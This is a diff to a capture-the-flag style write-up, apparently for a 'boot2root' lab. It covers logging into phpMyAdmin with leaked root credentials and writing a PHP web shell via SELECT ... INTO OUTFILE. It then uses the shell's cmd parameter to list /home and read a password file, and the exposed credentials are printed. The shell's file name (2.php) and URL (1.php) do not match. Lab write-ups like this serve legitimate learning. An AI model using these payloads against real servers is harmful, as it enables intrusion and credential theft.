@@ -64,24 +64,36 @@ Successful. Here we have two mails. One of them is called "DB Access". Inside we
 > You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
 > Best regards.
 
-We can try to use this login and password to acces the third directory found using DIRB - https://192.168.140.134/phpmyadmin/. Use login root and password Fg-'kKXBj87E:aJ$
+We can try to use this login and password to acces the third directory found using DIRB - https://10.111.1.24/phpmyadmin/. Use login root and password Fg-'kKXBj87E:aJ$
 Login successful. 
 
 PHP-MyAdmin is a GUI based interface for MySQL database. Next step we will to try to attack this database to access shell.
-We will use command shell_exec — Execute command via shell and return the complete output as a string.
+We will use command shell_exec — Execute command via shell and return the complete output as a string. The result we will output in the templates_c folder. Type in the window for SQL queries:
 
+SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/templates_c/2.php"
 
+Output will be on page https://10.111.1.24/forum/templates_c/1.php
 
+We can add shell commands to the end of the address string and get its output on this page. 
 
+First, we can look at the /home directory. Type afther the address string https://10.111.1.24/forum/templates_c/1.php the following:
 
+?cmd=ls /home
 
+The output is:
 
+> LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
 
+We have there seven directories: LOOKATME, ft_root, laurie, laurie@borntosec.net, lmezard, thor, zaz. Let's look what we have inside them. 
 
+In the directory LOOKATME there is a file "password". Other directories are empty. Lets look what is inside the "password" file. Type after the address string:
 
+?cmd=cat /home/LOOKATME/password
 
+The output is:
 
+lmezard:G!@M6f4Eatau{sF"
 
-
+So we have login and password: lmezard	G!@M6f4Eatau{sF"
 
 "brew install inetutils"
